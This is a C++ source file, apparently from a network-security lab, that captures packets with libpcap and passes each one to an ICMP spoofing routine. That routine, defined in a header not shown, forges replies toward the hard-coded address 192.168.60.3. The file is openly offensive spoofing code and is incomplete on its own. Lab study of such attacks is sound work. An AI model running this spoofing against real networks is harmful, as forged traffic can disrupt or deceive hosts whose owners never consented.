#include <pcap.h>

#include "icmpSpoof.hpp"

std::string targetIP("192.168.60.3");
std::string srcIP;

void got_packet(unsigned char *args, const struct pcap_pkthdr *header, const unsigned char *packet) {
  struct ipheader *ip = (struct ipheader *)(packet + sizeof(struct ethheader));
  struct icmpheader *icmp = (struct icmpheader *)(packet + sizeof(struct ethheader) + sizeof(struct ipheader));

  std::cout << "Got a packet\n";
  std::cout << "  From: " << inet_ntoa(ip->iph_sourceip) << "\n";
  std::cout << "  to: " << inet_ntoa(ip->iph_destip) << "\n";

  srcIP = inet_ntoa(ip->iph_destip);

  reping *redirect = new reping(targetIP, srcIP);
  redirect->run(*icmp, packet, header->len);
  delete redirect;
}

class sniff {
 private:
  std::string filter_exp;
  char errBuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp;
  bpf_u_int32 net;

 public:
  pcap_t *handle;
  std::string interFace;
  sniff() {}
  ~sniff() {}
  sniff(std::string filter) : filter_exp(filter) {}
  void startPcap() {
    handle = pcap_open_live(interFace.c_str(), BUFSIZ, 0, 1000, errBuf);
    pcap_compile(handle, &fp, filter_exp.c_str(), 0, net);
    pcap_setfilter(handle, &fp);
    pcap_loop(handle, -1, got_packet, nullptr);
    pcap_close(handle);
  }
};